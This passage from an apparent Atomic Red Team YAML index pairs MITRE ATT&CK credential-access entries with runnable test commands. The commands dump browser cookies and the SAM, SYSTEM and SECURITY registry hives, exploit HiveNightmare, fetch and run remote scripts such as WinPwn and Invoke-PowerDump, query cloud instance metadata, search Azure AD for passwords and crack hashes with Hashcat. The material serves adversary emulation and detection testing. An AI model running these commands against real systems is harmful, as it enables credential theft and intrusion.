          Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "$env:temp\sqlite.zip"
          Expand-Archive -path "$env:temp\sqlite.zip" -destinationpath "$env:temp\" -force
      executor:
        command: |
          stop-process -name "chrome" -force -erroraction silentlycontinue
          "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c #{sqlite3_path} "#{cookie_db}" | out-file -filepath "#{output_file}"
        cleanup_command: 'remove-item #{output_file}

          '
        name: powershell
        elevation_required: false
  T1003.002:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ed Williams, Trustwave, SpiderLabs
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011
      created: '2020-02-11T18:42:07.281Z'
      x_mitre_version: '1.0'
      external_references:
      - source_name: mitre-attack
        external_id: T1003.002
        url: https://attack.mitre.org/techniques/T1003/002
      - source_name: GitHub Creddump7
        url: https://github.com/Neohapsis/creddump7
        description: Flathers, R. (2018, February 19). creddump7. Retrieved April
          11, 2018.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may attempt to extract credential material from the
        Security Account Manager (SAM) database either through in-memory techniques
        or through the Windows Registry where the SAM database is stored. The SAM
        is a database file that contains local accounts for the host, typically those
        found with the <code>net user</code> command. Enumerating the SAM database
        requires SYSTEM level access.\n\nA number of tools can be used to retrieve
        the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n*
        [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively,
        the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam
        sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then
        be used to process the SAM database locally to retrieve hashes.(Citation:
        GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n*
        RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n"
      modified: '2022-06-15T16:17:19.049Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: 'OS Credential Dumping: Security Account Manager'
      x_mitre_detection: Hash dumpers open the Security Accounts Manager (SAM) on
        the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create
        a dump of the Registry SAM key to access stored account password hashes. Some
        hash dumpers will open the local file system as a device and parse to the
        SAM table to avoid file access defenses. Others will make an in-memory copy
        of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078)
        in-use by adversaries may help as well.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'File: File Access'
      - 'Command: Command Execution'
      - 'Windows Registry: Windows Registry Key Access'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1003.002
    atomic_tests:
    - name: Registry dump of SAM, creds, and secrets
      auto_generated_guid: 5c2571d0-1572-416d-9676-812e64ca9f44
      description: |
        Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
        via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7

        Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
      supported_platforms:
      - windows
      executor:
        command: |
          reg save HKLM\sam %temp%\sam
          reg save HKLM\system %temp%\system
          reg save HKLM\security %temp%\security
        cleanup_command: |
          del %temp%\sam >nul 2> nul
          del %temp%\system >nul 2> nul
          del %temp%\security >nul 2> nul
        name: command_prompt
        elevation_required: true
    - name: Registry parse with pypykatz
      auto_generated_guid: a96872b2-cbf3-46cf-8eb4-27e8c0e85263
      description: 'Parses registry hives to obtain stored credentials

        '
      supported_platforms:
      - windows
      dependency_executor_name: command_prompt
      dependencies:
      - description: 'Computer must have python 3 installed

          '
        prereq_command: |
          py -3 --version >nul 2>&1
          exit /b %errorlevel%
        get_prereq_command: 'echo "Python 3 must be installed manually"

          '
      - description: 'Computer must have pip installed

          '
        prereq_command: |
          py -3 -m pip --version >nul 2>&1
          exit /b %errorlevel%
        get_prereq_command: 'echo "PIP must be installed manually"

          '
      - description: 'pypykatz must be installed and part of PATH

          '
        prereq_command: |
          pypykatz -h >nul 2>&1
          exit /b %errorlevel%
        get_prereq_command: 'pip install pypykatz

          '
      executor:
        command: 'pypykatz live registry

          '
        name: command_prompt
        elevation_required: true
    - name: esentutl.exe SAM copy
      auto_generated_guid: a90c2f4d-6726-444e-99d2-a00cd7c20480
      description: |
        Copy the SAM hive using the esentutl.exe utility
        This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
      supported_platforms:
      - windows
      input_arguments:
        file_path:
          description: Path to the file to copy
          type: path
          default: "%SystemRoot%/system32/config/SAM"
        file_name:
          description: Name of the copied file
          type: string
          default: SAM
        copy_dest:
          description: Destination of the copied file
          type: string
          default: "%temp%"
      executor:
        command: 'esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}

          '
        name: command_prompt
        elevation_required: true
        cleanup_command: 'del #{copy_dest}\#{file_name} >nul 2>&1

          '
    - name: PowerDump Hashes and Usernames from Registry
      auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
      description: Executes a hashdump by reading the hashes from the registry.
      supported_platforms:
      - windows
      dependencies:
      - description: PowerDump script must exist on disk at specified location
        prereq_command: 'if (Test-Path "$Env:Temp\PowerDump.ps1") {exit 0} else {exit
          1} '
        get_prereq_command: Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"
          -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
      executor:
        command: |-
          Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
          Import-Module "$Env:Temp\PowerDump.ps1"
          Invoke-PowerDump
        name: powershell
        elevation_required: true
    - name: dump volume shadow copy hives with certutil
      auto_generated_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
      description: |
        Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as "HiveNightmare" or "SeriousSAM".
        This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
      supported_platforms:
      - windows
      input_arguments:
        target_hive:
          description: Hive you wish to dump
          type: string
          default: SAM
        limit:
          description: Limit to the number of shadow copies to iterate through when
            trying to copy the hive
          type: integer
          default: 10
      executor:
        command: 'for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}"
          %temp%\#{target_hive}vss%a 2 >nul 2>&1) && dir /B %temp%\#{target_hive}vss%a

          '
        name: command_prompt
        elevation_required: false
        cleanup_command: 'for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a
          >nul 2>&1)

          '
    - name: dump volume shadow copy hives with System.IO.File
      auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
      description: 'Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)

        '
      supported_platforms:
      - windows
      input_arguments:
        target_hive:
          description: Hive you wish to dump
          type: string
          default: SAM
        limit:
          description: Limit to the number of shadow copies to iterate through when
            trying to copy the hive
          type: integer
          default: 10
      executor:
        command: "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\"
          , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\"
          -ErrorAction Ignore\n}\n"
        name: powershell
        elevation_required: false
        cleanup_command: |
          1..#{limit} | % {
            rm "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
          }
    - name: WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
      auto_generated_guid: 0c0f5f06-166a-4f4d-bb4a-719df9a01dbb
      description: Loot local Credentials - Dump SAM-File for NTLM Hashes technique
        via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object
          net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile
          -consoleoutput -noninteractive  "
        name: powershell
  T1552.005:
    technique:
      modified: '2023-03-21T13:56:27.910Z'
      name: 'Unsecured Credentials: Cloud Instance Metadata API'
      description: |
        Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.

        Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)

        If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

        The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Praetorian
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Monitor access to the Instance Metadata API and look for anomalous queries.

        It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - IaaS
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'User Account: User Account Authentication'
      type: attack-pattern
      id: attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3
      created: '2020-02-11T18:47:46.619Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1552/005
        external_id: T1552.005
      - source_name: AWS Instance Metadata API
        description: AWS. (n.d.). Instance Metadata and User Data. Retrieved July
          18, 2019.
        url: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
      - source_name: RedLock Instance Metadata API 2018
        description: 'Higashi, Michael. (2018, May 15). Instance Metadata API: A Modern
          Day Trojan Horse. Retrieved July 16, 2019.'
        url: https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse
      - source_name: Krebs Capital One August 2019
        description: Krebs, B.. (2019, August 19). What We Can Learn from the Capital
          One Hack. Retrieved March 25, 2020.
        url: https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1552.005
    atomic_tests:
    - name: Azure - Search Azure AD User Attributes for Passwords
      auto_generated_guid: ae9b2e3e-efa1-4483-86e2-fae529ab9fb6
      description: "This test uses the MSOnline Powershell module to retrieve all
        user attributes for a specified account, which can sometimes contain unsecured
        credentials. \nUpon successful execution, this test will scan all user attributes
        for any strings containing \"password\".\nThose unsecured credentials will
        be output to a text file, as well as the account that they are associated
        with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n"
      supported_platforms:
      - azure-ad
      input_arguments:
        username:
          description: Azure AD username
          type: string
          default: 
        password:
          description: Azure AD password
          type: string
          default: T1082Az
      dependency_executor_name: powershell
      dependencies:
      - description: 'The MSOnline module must be installed.

          '
        prereq_command: 'if (get-command Get-MsolUser -erroraction silentlycontinue){exit
          0} else {exit 1}

          '
        get_prereq_command: 'install-module MSOnline

          '
      executor:
        command: "import-module msonline\n$Password = ConvertTo-SecureString -String
          \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
          $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser
          -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name};
          \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\"
          + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop)
          | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content
          -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n"
        cleanup_command: 'remove-item $env:temp\T1552.005Test1.txt -force -erroraction
          silentlycontinue

          '
        name: powershell
        elevation_required: true
    - name: Azure - Dump Azure Instance Metadata from Virtual Machines
      auto_generated_guid: cc99e772-4e18-4f1f-b422-c5cdd1bfd7b7
      description: "This test invokes a web request to the default Instance Metadata
        API of 169.254.169.254 in order to dump the data contained within it to a
        file. \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n"
      supported_platforms:
      - iaas:azure
      input_arguments:
        output_file:
          description: File to output metadata to
          type: string
          default: "$env:temp\\T1552.005Test2.txt"
      executor:
        command: 'Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri
          "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json
          -Depth 64 > #{output_file}

          '
        cleanup_command: 'remove-item #{output_file} -force -erroraction silentlycontinue

          '
        name: powershell
  T1555.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72
      type: attack-pattern
      created: '2020-02-12T18:56:31.051Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1555.002
        url: https://attack.mitre.org/techniques/T1555/002
      - url: http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain
        description: Juuso Salonen. (2012, September 5). Breaking into the OS X keychain.
          Retrieved July 15, 2017.
        source_name: OS X Keychain
      - url: https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/
        description: Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware
          is hungry for credentials. Retrieved July 3, 2017.
        source_name: OSX Keydnap malware
      - url: http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way
        description: Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to
          DA, the OS X Way. Retrieved July 3, 2017.
        source_name: External to DA, the OS X Way
      modified: '2022-03-08T21:43:20.609Z'
      name: Securityd Memory
      description: |-
        An adversary may obtain root access (allowing them to read securityd‚Äôs memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user‚Äôs logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)

        In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple‚Äôs keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple‚Äôs securityd utility takes the user‚Äôs logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user‚Äôs password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitor processes and command-line arguments for activity
        surrounded users searching for credentials or using automated tools to scan
        memory for passwords.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Access'
      x_mitre_permissions_required:
      - root
    atomic_tests: []
  T1522:
    technique:
      x_mitre_platforms:
      - IaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Praetorian
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--1c2fd73a-e634-44ed-b1b5-9e7cf7404e9f
      type: attack-pattern
      created: '2019-09-04T14:41:32.317Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1522
        url: https://attack.mitre.org/techniques/T1522
      - source_name: AWS Instance Metadata API
        url: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
        description: AWS. (n.d.). Instance Metadata and User Data. Retrieved July
          18, 2019.
      - description: 'Higashi, Michael. (2018, May 15). Instance Metadata API: A Modern
          Day Trojan Horse. Retrieved July 16, 2019.'
        url: https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse
        source_name: RedLock Instance Metadata API 2018
      modified: '2021-03-08T10:33:01.542Z'
      name: Cloud Instance Metadata API
      description: |
        Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.

        Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API)

        If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

        The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |
        * Monitor access to the Instance Metadata API and look for anomalous queries.
        * It may be possible to detect adversary use of credentials they have obtained. See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1110.002:
    technique:
      modified: '2023-03-30T21:01:48.643Z'
      name: 'Brute Force: Password Cracking'
      description: "Adversaries may use password cracking to attempt to recover usable
        credentials, such as plaintext passwords, when credential material such as
        password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
        can be used to obtain password hashes, this may only get an adversary so far
        when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not
        an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602)
        in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A)
        \n\nTechniques to systematically guess the passwords used to compute hashes
        are available, or the adversary may use a pre-computed rainbow table to crack
        hashes. Cracking hashes is usually done on adversary-controlled systems outside
        of the target network.(Citation: Wikipedia Password cracking) The resulting
        plaintext password resulting from a successfully cracked hash may be used
        to log into systems, resources, and services in which the account has access."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Mohamed Kmal
      x_mitre_deprecated: false
      x_mitre_detection: It is difficult to detect when hashes are cracked, since
        this is generally done outside the scope of the target network. Consider focusing
        efforts on detecting other adversary behavior used to acquire credential materials,
        such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
        or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Office 365
      - Azure AD
      - Network
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'User Account: User Account Authentication'
      - 'Application Log: Application Log Content'
      type: attack-pattern
      id: attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d
      created: '2020-02-11T18:38:56.197Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1110/002
        external_id: T1110.002
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      - source_name: Wikipedia Password cracking
        description: Wikipedia. (n.d.). Password cracking. Retrieved December 23,
          2015.
        url: https://en.wikipedia.org/wiki/Password_cracking
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      identifier: T1110.002
    atomic_tests:
    - name: Password Cracking with Hashcat
      auto_generated_guid: 6d27df5d-69d4-4c91-bc33-5983ffe91692
      description: Execute Hashcat.exe with provided SAM file from registry of Windows
        and Password list to crack against
      supported_platforms:
      - windows
      input_arguments:
        hashcat_exe:
          description: Path to Hashcat executable
          type: string
          default: "%temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe"
        input_file_sam:
          description: Path to SAM file
          type: string
          default: PathToAtomicsFolder\T1110.002\src\sam.txt
        input_file_passwords:
          description: Path to password list
          type: string
          default: PathToAtomicsFolder\T1110.002\src\password.lst
      dependency_executor_name: powershell
      dependencies:
      - description: Hashcat must exist on disk at specified location (#{hashcat_exe})
        prereq_command: 'if (Test-Path  $(cmd /c echo #{hashcat_exe})) {exit 0} else
          {exit 1}'
        get_prereq_command: |-
          Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "$env:TEMP\7z1900.exe"
          Start-Process -FilePath "$env:Temp\7z1900.exe" -ArgumentList "/S /D=$env:temp\7zi" -NoNewWindow
          Invoke-WebRequest "https://hashcat.net/files/hashcat-6.1.1.7z" -OutFile "$env:TEMP\hashcat6.7z"
          Start-Process cmd.exe -Args  "/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip" -Wait
          New-Item -ItemType Directory (Split-Path $(cmd /c echo #{hashcat_exe})) -Force | Out-Null
          Move-Item $env:Temp\hashcat-unzip\hashcat-6.1.1\* $(cmd /c echo #{hashcat_exe}\..) -Force -ErrorAction Ignore
      executor:
        command: |-
          cd #{hashcat_exe}\..
          #{hashcat_exe} -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}
        cleanup_command: |-
          del %temp%\hashcat6.7z >nul 2>&1
          del %temp%\7z1900.exe >nul 2>&1
          del %temp%\7z /Q /S >nul 2>&1
          del %temp%\hashcat-unzip /Q /S >nul 2>&1
        name: command_prompt
        elevation_required: true
  T1555.001:
    technique:
      x_mitre_platforms:
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3
      created: '2020-02-12T18:55:24.728Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1555.001
        url: https://attack.mitre.org/techniques/T1555/001
      - source_name: External to DA, the OS X Way
        url: http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way
        description: Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to
          DA, the OS X Way. Retrieved July 3, 2017.
      - source_name: Keychain Services Apple
        url: https://developer.apple.com/documentation/security/keychain_services
        description: Apple. (n.d.). Keychain Services. Retrieved April 11, 2022.
      - source_name: Empire Keychain Decrypt
        url: https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/collection/osx/keychaindump_decrypt.py
        description: Empire. (2018, March 8). Empire keychaindump_decrypt Module.
          Retrieved April 14, 2022.
      - source_name: OSX Keychain Schaumann
        url: https://www.netmeister.org/blog/keychain-passwords.html
        description: Jan Schaumann. (2015, November 5). Using the OS X Keychain to
          store and retrieve passwords. Retrieved March 31, 2022.
      - source_name: Keychain Decryption Passware
        url: https://support.passware.com/hc/en-us/articles/4573379868567-A-Deep-Dive-into-Apple-Keychain-Decryption
        description: Yana Gourenko. (n.d.). A Deep Dive into Apple Keychain Decryption.
          Retrieved April 13, 2022.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may acquire credentials from Keychain. Keychain (or
        Keychain Services) is the macOS credential management system that stores account
        names, passwords, private keys, certificates, sensitive application data,
        payment data, and secure notes. There are three types of Keychains: Login
        Keychain, System Keychain, and Local Items (iCloud) Keychain. The default
        Keychain is the Login Keychain, which stores user passwords and information.
        The System Keychain stores items accessed by the operating system, such as
        items shared among users on a host. The Local Items (iCloud) Keychain is used
        for items synced with Apple‚Äôs iCloud service. \n\nKeychains can be viewed
        and edited through the Keychain Access application or using the command-line
        utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>,
        <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation:
        Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation:
        OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain
        storage/memory. For example, the command <code>security dump-keychain ‚Äìd</code>
        will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>.
        Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code>
        file. Both methods require a password, where the default password for the
        Login Keychain is the current user‚Äôs password to login to the macOS host.(Citation:
        External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  "
      modified: '2022-04-18T20:32:22.122Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: 'Credentials from Password Stores: Keychain'
      x_mitre_detection: Unlocking the keychain and using passwords from it is a very
        common process, so there is likely to be a lot of noise in any detection technique.
        Monitoring of system calls to the keychain can help determine if there is
        a suspicious process trying to access it.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'File: File Access'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Process: OS API Execution'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1555.001
    atomic_tests:
    - name: Keychain
      auto_generated_guid: 1864fdec-ff86-4452-8c30-f12507582a93
      description: |
        ### Keychain Files

          ~/Library/Keychains/

          /Library/Keychains/

          /Network/Library/Keychains/

          [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)

          [Keychain dumper](https://github.com/juuso/keychaindump)
      supported_platforms:
      - macos
      input_arguments:
        cert_export:
          description: Specify the path of the certificates to export.
          type: path
          default: "/tmp/certs.pem"
      executor:
        command: |
          security -h
          security find-certificate -a -p > #{cert_export}
          security import #{cert_export} -k
        name: sh
  T1003.004:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ed Williams, Trustwave, SpiderLabs
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc
      type: attack-pattern
      created: '2020-02-21T16:22:09.493Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1003.004
        url: https://attack.mitre.org/techniques/T1003/004
      - source_name: Passcape LSA Secrets
        url: https://www.passcape.com/index.php?section=docsys&cmd=details&id=23
        description: Passcape. (n.d.). Windows LSA secrets. Retrieved February 21,
          2020.
      - source_name: Microsoft AD Admin Tier Model
        url: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN
        description: Microsoft. (2019, February 14). Active Directory administrative
          tier model. Retrieved February 21, 2020.
      - source_name: Tilbury Windows Credentials
        url: https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf
        description: 'Chad Tilbury. (2017, August 8). 1Windows Credentials: Attack,
          Mitigation, Defense. Retrieved February 21, 2020.'
      - source_name: ired Dumping LSA Secrets
        url: https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets
        description: Mantvydas Baranauskas. (2019, November 16). Dumping LSA Secrets.
          Retrieved February 21, 2020.
      - url: https://github.com/mattifestation/PowerSploit
        description: PowerSploit. (n.d.). Retrieved December 4, 2014.
        source_name: Powersploit
      modified: '2021-04-21T21:12:38.361Z'
      name: 'OS Credential Dumping: LSA Secrets'
      description: |-
